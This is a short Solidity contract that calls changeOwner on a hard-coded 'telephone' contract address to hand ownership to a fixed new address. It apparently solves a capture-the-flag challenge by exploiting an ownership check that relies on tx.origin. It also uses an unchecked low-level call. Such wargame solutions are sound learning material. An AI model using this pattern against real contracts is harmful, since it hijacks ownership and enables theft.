pragma solidity ^0.4.24;

contract ChangeTelephoneOwnerDelegate {
    address telephone = address(0x879522B01D127Cec6905E7097279f11091c39d63);
    address newOwner = address(0x58f97a34bA5910D79594Ad1ab80438e2c54763b4);

    function changeOwner() public {
        telephone.call(bytes4(keccak256("changeOwner(address)")),newOwner);
    }
}